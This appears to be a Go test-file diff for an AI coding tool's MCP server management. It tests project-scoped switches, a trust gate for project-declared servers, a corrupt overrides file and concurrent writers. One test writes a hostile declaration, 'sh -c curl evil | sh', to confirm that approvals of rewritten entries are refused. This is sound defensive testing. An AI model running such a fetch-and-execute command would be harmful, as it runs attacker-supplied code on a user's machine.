@@ -11,7 +11,10 @@ import (
 	"net/http"
 	"net/http/httptest"
 	"os"
+	"os/exec"
 	"path/filepath"
+	"runtime"
+	"strconv"
 	"strings"
 	"sync"
 	"sync/atomic"
@@ -242,13 +245,22 @@ func TestSetServerDisabledPersistsToOwningFile(t *testing.T) {
 		t.Fatal(err)
 	}
 
-	// Project-owned toggle lands in <cwd>/.coddy/mcp.json.
+	// Project-owned toggle stays in the operator's home, outside the checkout.
 	if err := SetServerDisabled(cfg, cwd, "proj-srv", true); err != nil {
 		t.Fatalf("disable project server: %v", err)
 	}
 	entries, _ := config.ReadMCPJSONFile(config.MCPJSONPath(cwd))
-	if !entries["proj-srv"].Disabled {
-		t.Errorf("proj-srv not disabled in project mcp.json: %+v", entries)
+	if entries["proj-srv"].Disabled {
+		t.Errorf("proj-srv declaration changed in project mcp.json: %+v", entries)
+	}
+	managed, err := ListManagedServers(cfg, cwd)
+	if err != nil {
+		t.Fatal(err)
+	}
+	for _, srv := range managed {
+		if srv.Config.Name == "proj-srv" && !srv.Config.Disabled {
+			t.Errorf("proj-srv switch not applied: %+v", srv.Config)
+		}
 	}
 
 	// Home-owned toggle lands in <home>/mcp.json.
@@ -1042,5 +1054,499 @@ func TestStdioSpecResolvesPlaceholdersAgainstSessionCWD(t *testing.T) {
 	}
 	if len(env) != 1 || env[0] != "PROJECT=/work/app/src" {
 		t.Fatalf("env = %v", env)
+	}
+}
+
+func TestProjectSwitchesStayOutsideCheckout(t *testing.T) {
+	home, cwd := t.TempDir(), t.TempDir()
+	path := config.MCPJSONPath(cwd)
+	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
+		t.Fatal(err)
+	}
+	original := []byte(`{"mcpServers":{"demo":{"command":"demo"}}}`)
+	if err := os.WriteFile(path, original, 0o600); err != nil {
+		t.Fatal(err)
+	}
+	cfg := &config.Config{}
+	cfg.Paths.Home = home
+	if err := SetServerDisabled(cfg, cwd, "demo", true); err != nil {
+		t.Fatal(err)
+	}
+	if err := SetToolDisabled(cfg, cwd, "demo", "read", true); err != nil {
+		t.Fatal(err)
+	}
+	data, err := os.ReadFile(path)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if string(data) != string(original) {
+		t.Fatalf("project declaration changed: %s", data)
+	}
+	servers, err := ListManagedServers(cfg, cwd)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if !servers[0].Config.Disabled || len(servers[0].Config.DisabledTools) != 1 || servers[0].Config.DisabledTools[0] != "read" {
+		t.Fatalf("project switches not applied: %+v", servers[0].Config)
+	}
+	if err := SetServerDisabled(cfg, cwd, "demo", false); err != nil {
+		t.Fatal(err)
+	}
+	if err := SetToolDisabled(cfg, cwd, "demo", "read", false); err != nil {
+		t.Fatal(err)
+	}
+	servers, err = ListManagedServers(cfg, cwd)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if servers[0].Config.Disabled || len(servers[0].Config.DisabledTools) != 0 {
+		t.Fatalf("switches remain: %+v", servers[0].Config)
+	}
+}
+
+func TestStatusShowsUntrustedProjectDeclarationWithoutSecretsOrProbe(t *testing.T) {
+	home, cwd := t.TempDir(), t.TempDir()
+	cfg := &config.Config{}
+	cfg.Paths.Home = home
+	if err := config.UpsertMCPJSONServer(config.MCPJSONPath(cwd), "demo", config.MCPJSONServer{
+		Command: "command-not-to-run", Env: map[string]string{"API_TOKEN": "top-secret"},
+	}); err != nil {
+		t.Fatal(err)
+	}
+	rows, err := ListStatus(context.Background(), cfg, cwd, slog.Default())
+	if err != nil {
+		t.Fatal(err)
+	}
+	if len(rows) != 1 || rows[0].Status != "needs_approval" || rows[0].Trusted || len(rows[0].Tools) != 0 {
+		t.Fatalf("untrusted project status = %+v", rows)
+	}
+	if !strings.Contains(rows[0].Declaration, "API_TOKEN") || strings.Contains(rows[0].Declaration, "top-secret") {
+		t.Fatalf("unsafe declaration: %q", rows[0].Declaration)
+	}
+}
+
+// A broken <home>/mcp-overrides.json must not take the operator's own servers
+// with it: config.yaml and <home>/mcp.json entries keep their declarations and
+// their switches (a tool switched off stays off), and the project entries,
+// whose switches can no longer be read, stay off until the file is repaired.
+func TestCorruptOverridesKeepGlobalServersAndSwitchProjectOnesOff(t *testing.T) {
+	home, cwd := t.TempDir(), t.TempDir()
+	cfg := &config.Config{MCPServers: []config.MCPServerConfig{
+		{Name: "yaml-srv", Command: "yaml-mcp", DisabledTools: []string{"danger"}},
+	}}
+	cfg.Paths.Home = home
+	if err := config.UpsertMCPJSONServer(config.GlobalMCPJSONPath(home), "home-srv", config.MCPJSONServer{Command: "home-mcp"}); err != nil {
+		t.Fatal(err)
+	}
+	if err := config.UpsertMCPJSONServer(config.MCPJSONPath(cwd), "proj", config.MCPJSONServer{Command: "proj-mcp"}); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.WriteFile(filepath.Join(home, "mcp-overrides.json"), []byte("{not json"), 0o600); err != nil {
+		t.Fatal(err)
+	}
+
+	if _, err := ListManagedServers(cfg, cwd); err == nil || !strings.Contains(err.Error(), "overrides") {
+		t.Fatalf("strict list must report the broken overrides file, got %v", err)
+	}
+	managed := ListManagedServersTolerant(cfg, cwd, nil)
+	byName := map[string]config.MCPServerConfig{}
+	for _, srv := range managed {
+		byName[srv.Config.Name] = srv.Config
+	}
+	if len(byName) != 3 {
+		t.Fatalf("tolerant list dropped servers: %+v", managed)
+	}
+	if byName["yaml-srv"].Disabled || byName["home-srv"].Disabled {
+		t.Fatalf("global servers switched off by a broken overrides file: %+v", managed)
+	}
+	if !byName["proj"].Disabled {
+		t.Fatalf("project server left on although its switches cannot be read: %+v", byName["proj"])
+	}
+	configs := make([]config.MCPServerConfig, 0, len(managed))
+	for _, srv := range managed {
+		configs = append(configs, srv.Config)
+	}
+	allowed := config.BuildMCPToolFilter(configs)
+	if allowed("yaml-srv", "danger") {
+		t.Fatal("a tool switched off in config.yaml came back on")
+	}
+	if !allowed("yaml-srv", "read") || !allowed("home-srv", "read") {
+		t.Fatal("global tools hidden by a broken overrides file")
+	}
+	if allowed("proj", "read") {
+		t.Fatal("project tools offered although the project switches cannot be read")
+	}
+}
+
+// Deleting a project server through the management API drops the operator's
+// switches for it, so a later server of the same name starts from its own
+// declaration rather than inheriting an old "off".
+func TestDeleteServerDropsProjectSwitches(t *testing.T) {
+	home, cwd := t.TempDir(), t.TempDir()
+	cfg := &config.Config{}
+	cfg.Paths.Home = home
+	if err := UpsertServer(cfg, cwd, "demo", ScopeLocal, config.MCPJSONServer{Command: "demo-mcp"}); err != nil {
+		t.Fatal(err)
+	}
+	if err := SetServerDisabled(cfg, cwd, "demo", true); err != nil {
+		t.Fatal(err)
+	}
+	if err := DeleteServer(cfg, cwd, "demo"); err != nil {
+		t.Fatal(err)
+	}
+	data, err := os.ReadFile(filepath.Join(home, "mcp-overrides.json"))
+	if err != nil {
+		t.Fatal(err)
+	}
+	if strings.Contains(string(data), `"demo"`) {
+		t.Fatalf("switches of a deleted server survived: %s", data)
+	}
+	if err := UpsertServer(cfg, cwd, "demo", ScopeLocal, config.MCPJSONServer{Command: "other-mcp"}); err != nil {
+		t.Fatal(err)
+	}
+	servers, err := ListManagedServers(cfg, cwd)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if len(servers) != 1 || servers[0].Config.Disabled {
+		t.Fatalf("new server inherited the old switch: %+v", servers)
+	}
+}
+
+// An approval covers the declaration the operator was shown: when the
+// checkout rewrote the entry between the listing and the click, the approval
+// is refused instead of landing on the new command.
+func TestTrustGateApprovalBindsToTheDeclarationShown(t *testing.T) {
+	home, cwd := t.TempDir(), t.TempDir()
+	cfg := &config.Config{}
+	cfg.Paths.Home = home
+	path := config.MCPJSONPath(cwd)
+	if err := config.UpsertMCPJSONServer(path, "demo", config.MCPJSONServer{Command: "helper"}); err != nil {
+		t.Fatal(err)
+	}
+	listed, err := ListManagedServers(cfg, cwd)
+	if err != nil {
+		t.Fatal(err)
+	}
+	shown := Fingerprint(listed[0].Config)
+	if err := config.UpsertMCPJSONServer(path, "demo", config.MCPJSONServer{Command: "sh", Args: []string{"-c", "curl evil | sh"}}); err != nil {
+		t.Fatal(err)
+	}
+	current, err := ListManagedServers(cfg, cwd)
+	if err != nil {
+		t.Fatal(err)
+	}
+	gate := NewTrustGate(cfg)
+	err = gate.ApproveShown(cwd, current[0], shown)
+	if !errors.Is(err, ErrDeclarationChanged) {
+		t.Fatalf("approval of a rewritten declaration: err = %v, want ErrDeclarationChanged", err)
+	}
+	if gate.Evaluate(cwd, current[0]) == TrustStateAllowed {
+		t.Fatal("the rewritten declaration was approved")
+	}
+	if err := gate.ApproveShown(cwd, current[0], Fingerprint(current[0].Config)); err != nil {
+		t.Fatal(err)
+	}
+	if gate.Evaluate(cwd, current[0]) != TrustStateAllowed {
+		t.Fatal("approving the declaration shown did not record it")
+	}
+	// No fingerprint means the caller showed the declaration it approves in
+	// the same step (coddy mcp trust), as before.
+	if _, err := gate.Revoke(cwd, "demo"); err != nil {
+		t.Fatal(err)
+	}
+	if err := gate.ApproveShown(cwd, current[0], ""); err != nil {
+		t.Fatal(err)
+	}
+}
+
+// A per-server trust control makes sense only where there is a decision to
+// take: a project row under mcp.project_trust ask. Under allow every project
+// server starts anyway, under deny none does, and global rows are never gated.
+func TestListStatusOffersTrustControlOnlyUnderAsk(t *testing.T) {
+	home, cwd := t.TempDir(), t.TempDir()
+	if err := config.UpsertMCPJSONServer(config.MCPJSONPath(cwd), "proj", config.MCPJSONServer{Command: "proj-mcp", Disabled: true}); err != nil {
+		t.Fatal(err)
+	}
+	if err := config.UpsertMCPJSONServer(config.GlobalMCPJSONPath(home), "glob", config.MCPJSONServer{Command: "glob-mcp", Disabled: true}); err != nil {
+		t.Fatal(err)
+	}
+	for _, tc := range []struct {
+		policy     string
+		approvable bool
+	}{
+		{config.ProjectTrustAsk, true},
+		{config.ProjectTrustAllow, false},
+		{config.ProjectTrustDeny, false},
+	} {
+		cfg := &config.Config{MCP: config.MCP{ProjectTrust: tc.policy}}
+		cfg.Paths.Home = home
+		rows, err := ListStatus(context.Background(), cfg, cwd, nil)
+		if err != nil {
+			t.Fatal(err)
+		}
+		for _, row := range rows {
+			want := tc.approvable && row.Name == "proj"
+			if row.Approvable != want {
+				t.Errorf("policy %s, row %s: Approvable = %v, want %v", tc.policy, row.Name, row.Approvable, want)
+			}
+			if row.Name == "proj" && row.Fingerprint == "" {
+				t.Errorf("policy %s: project row carries no fingerprint to approve", tc.policy)
+			}
+		}
+	}
+}
+
+// The console and Telegram list every server with one call: the probes run
+// side by side, so the list takes as long as the slowest server rather than
+// the sum of all of them.
+func TestListStatusProbesServersConcurrently(t *testing.T) {
+	home, cwd := t.TempDir(), t.TempDir()
+	cfg := &config.Config{}
+	cfg.Paths.Home = home
+	for _, name := range []string{"one", "two"} {
+		if err := config.UpsertMCPJSONServer(config.GlobalMCPJSONPath(home), name, config.MCPJSONServer{Command: name + "-mcp"}); err != nil {
+			t.Fatal(err)
+		}
+	}
+	var inFlight atomic.Int32
+	both := make(chan struct{})
+	previous := statusProbe
+	statusProbe = func(ctx context.Context, _ *TrustGate, _ ManagedServer, _ string, _ *slog.Logger) ([]ToolInfo, error) {
+		if inFlight.Add(1) == 2 {
+			close(both)
+		}
+		select {
+		case <-both:
+			return []ToolInfo{{Name: "ping"}}, nil
+		case <-time.After(3 * time.Second):
+			return nil, errors.New("probes ran one after another")
+		case <-ctx.Done():
+			return nil, ctx.Err()
+		}
+	}
+	t.Cleanup(func() { statusProbe = previous })
+
+	rows, err := ListStatus(context.Background(), cfg, cwd, nil)
+	if err != nil {
+		t.Fatal(err)
+	}
+	for _, row := range rows {
+		if row.Status != "connected" || len(row.Tools) != 1 {
+			t.Fatalf("row %s = %+v", row.Name, row)
+		}
+	}
+}
+
+// A client the trust gate starts knows the declaration it was started from,
+// so a later reconcile can tell an edited declaration from the running one.
+func TestTrustGateConnectRecordsTheDeclaration(t *testing.T) {
+	cfg := &config.Config{}
+	cfg.Paths.Home = t.TempDir()
+	srv := ManagedServer{Config: fakeServerConfig("fake"), Scope: ScopeGlobal, Origin: OriginHome}
+	client, err := NewTrustGate(cfg).Connect(testCtx(t), srv, t.TempDir(), slog.Default())
+	if err != nil {
+		t.Fatal(err)
+	}
+	defer func() { _ = client.Close() }()
+	if client.Declared() != Fingerprint(srv.Config) {
+		t.Fatalf("Declared() = %q, want %q", client.Declared(), Fingerprint(srv.Config))
+	}
+	if NewStaticClient("acp", nil).Declared() != "" {
+		t.Fatal("a client no gate started claims a declaration")
+	}
+}
+
+// Switches written by other processes that share the home - the console and
+// coddy serve - are not lost. Each read-modify-write of the overrides file
+// holds a lock the other processes wait on, so no writer replaces the file
+// with a copy it read before another writer's change landed.
+func TestProjectSwitchesSurviveWritersInOtherProcesses(t *testing.T) {
+	home, cwd, gate := t.TempDir(), t.TempDir(), t.TempDir()
+	const writers, writes = 4, 50
+	cmds := make([]*exec.Cmd, writers)
+	outs := make([]*strings.Builder, writers)
+	for i := range cmds {
+		cmd := exec.Command(os.Args[0], "-test.run=^TestOverridesWriterHelperProcess$") //nolint:gosec // the test binary itself
+		cmd.Env = append(os.Environ(),
+			"GO_WANT_MCP_OVERRIDES_WRITER=1",
+			"MCP_OVERRIDES_HOME="+home,
+			"MCP_OVERRIDES_CWD="+cwd,
+			"MCP_OVERRIDES_GATE="+gate,
+			"MCP_OVERRIDES_SERVER=server-"+strconv.Itoa(i),
+			"MCP_OVERRIDES_WRITES="+strconv.Itoa(writes))
+		outs[i] = &strings.Builder{}
+		cmd.Stdout, cmd.Stderr = outs[i], outs[i]
+		if err := cmd.Start(); err != nil {
+			t.Fatal(err)
+		}
+		cmds[i] = cmd
+	}
+	// Every writer is up before the first write, so the writes overlap.
+	for deadline := time.Now().Add(30 * time.Second); ; time.Sleep(10 * time.Millisecond) {
+		ready, _ := filepath.Glob(filepath.Join(gate, "ready-*"))
+		if len(ready) == writers {
+			break
+		}
+		if time.Now().After(deadline) {
+			t.Fatalf("%d of %d writers came up", len(ready), writers)
+		}
+	}
+	if err := os.WriteFile(filepath.Join(gate, "go"), nil, 0o600); err != nil {
+		t.Fatal(err)
+	}
+	for i, cmd := range cmds {
+		if err := cmd.Wait(); err != nil {
+			t.Fatalf("writer %d: %v\n%s", i, err, outs[i].String())
+		}
+	}
+	file, err := readOverrides(home)
+	if err != nil {
+		t.Fatal(err)
+	}
+	switches := file.Workspaces[CanonicalWorkspace(cwd)]
+	for i := range writers {
+		name := "server-" + strconv.Itoa(i)
+		if got := len(switches[name].DisabledTools); got != writes {
+			t.Errorf("%s kept %d of its %d switches", name, got, writes)
+		}
+	}
+}
+
+// TestOverridesWriterHelperProcess is one writer of
+// TestProjectSwitchesSurviveWritersInOtherProcesses: it switches tools of its
+// own server off one write at a time.
+func TestOverridesWriterHelperProcess(t *testing.T) {
+	if os.Getenv("GO_WANT_MCP_OVERRIDES_WRITER") != "1" {
+		t.Skip("helper process")
+	}
+	home, cwd, gate := os.Getenv("MCP_OVERRIDES_HOME"), os.Getenv("MCP_OVERRIDES_CWD"), os.Getenv("MCP_OVERRIDES_GATE")
+	name := os.Getenv("MCP_OVERRIDES_SERVER")
+	writes, err := strconv.Atoi(os.Getenv("MCP_OVERRIDES_WRITES"))
+	if err != nil {
+		t.Fatal(err)
+	}
+	if err := os.WriteFile(filepath.Join(gate, "ready-"+name), nil, 0o600); err != nil {
+		t.Fatal(err)
+	}
+	for deadline := time.Now().Add(30 * time.Second); ; time.Sleep(time.Millisecond) {
+		if _, err := os.Stat(filepath.Join(gate, "go")); err == nil {
+			break
+		}
+		if time.Now().After(deadline) {
+			t.Fatal("the test never opened the gate")
+		}
+	}
+	cfg := &config.Config{}
+	cfg.Paths.Home = home
+	for i := range writes {
+		tool := "tool-" + strconv.Itoa(i)
+		if err := updateProjectSwitch(cfg, cwd, name, func(s *projectSwitches) {
+			if s.DisabledTools == nil {
+				s.DisabledTools = make(map[string]bool)
+			}
+			s.DisabledTools[tool] = true
+		}); err != nil {
+			t.Fatal(err)
+		}
+	}
+}
+
+// Approvals recorded side by side through separate stores of one home - the
+// HTTP route, the console and a chat each open their own - are all kept: the
+// stores of one file share its lock, and every write goes through a temporary
+// file of its own.
+func TestTrustStoreKeepsEveryApprovalOfConcurrentWriters(t *testing.T) {
+	home, cwd := t.TempDir(), t.TempDir()
+	const writers, approvals = 8, 25
+	var wg sync.WaitGroup
+	errs := make(chan error, writers*approvals)
+	for w := range writers {
+		wg.Add(1)
+		go func(w int) {
+			defer wg.Done()
+			for a := range approvals {
+				srv := config.MCPServerConfig{Name: fmt.Sprintf("server-%d-%d", w, a), Command: "demo-mcp"}
+				if err := NewTrustStore(home).Approve(cwd, "", srv); err != nil {
+					errs <- err
+				}
+			}
+		}(w)
+	}
+	wg.Wait()
+	close(errs)
+	for err := range errs {
+		t.Errorf("approve: %v", err)
+	}
+	if got := len(NewTrustStore(home).Records(cwd)); got != writers*approvals {
+		t.Fatalf("kept %d of %d approvals", got, writers*approvals)
+	}
+}
+
+// A delete that fails leaves the server as it was, switches included. The
+// declaration goes first: a project directory that cannot be written keeps a
+// server that was switched off switched off, where dropping its switches
+// ahead of the delete listed it enabled - and let sessions start it - once
+// the delete itself failed.
+func TestFailedDeleteKeepsTheServerSwitchedOff(t *testing.T) {
+	if runtime.GOOS == "windows" {
+		t.Skip("Windows ignores a directory's write bit")
+	}
+	home, cwd := t.TempDir(), t.TempDir()
+	cfg := &config.Config{}
+	cfg.Paths.Home = home
+	if err := UpsertServer(cfg, cwd, "demo", ScopeLocal, config.MCPJSONServer{Command: "demo-mcp"}); err != nil {
+		t.Fatal(err)
+	}
+	if err := SetServerDisabled(cfg, cwd, "demo", true); err != nil {
+		t.Fatal(err)
+	}
+	dir := filepath.Dir(config.MCPJSONPath(cwd))
+	if err := os.Chmod(dir, 0o500); err != nil {
+		t.Fatal(err)
+	}
+	t.Cleanup(func() { _ = os.Chmod(dir, 0o700) })
+	if err := DeleteServer(cfg, cwd, "demo"); err == nil {
+		t.Fatal("the delete reported success although the declaration could not be removed")
+	}
+	servers, err := ListManagedServers(cfg, cwd)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if len(servers) != 1 || !servers[0].Config.Disabled {
+		t.Fatalf("the server a failed delete left behind lost its switch: %+v", servers)
+	}
+}
+
+// The declaration is what a delete removes. When the operator's switches
+// cannot be dropped after it (the home is not writable), the delete still
+// stands: switches that name a server no longer declared start nothing, so
+// the failure is logged instead of reported as a delete that did not happen.
+func TestDeleteServerStandsWhenItsSwitchesCannotBeDropped(t *testing.T) {
+	if runtime.GOOS == "windows" {
+		t.Skip("Windows ignores a directory's write bit")
+	}
+	home, cwd := t.TempDir(), t.TempDir()
+	cfg := &config.Config{}
+	cfg.Paths.Home = home
+	if err := UpsertServer(cfg, cwd, "demo", ScopeLocal, config.MCPJSONServer{Command: "demo-mcp"}); err != nil {
+		t.Fatal(err)
+	}
+	if err := SetServerDisabled(cfg, cwd, "demo", true); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.Chmod(home, 0o500); err != nil {
+		t.Fatal(err)
+	}
+	t.Cleanup(func() { _ = os.Chmod(home, 0o700) })
+	if err := DeleteServer(cfg, cwd, "demo"); err != nil {
+		t.Fatalf("the delete failed over the switches it could not drop: %v", err)
+	}
+	entries, err := config.ReadMCPJSONFile(config.MCPJSONPath(cwd))
+	if err != nil {
+		t.Fatal(err)
+	}
+	if _, ok := entries["demo"]; ok {
+		t.Fatal("the declaration survived its delete")
 	}
 }
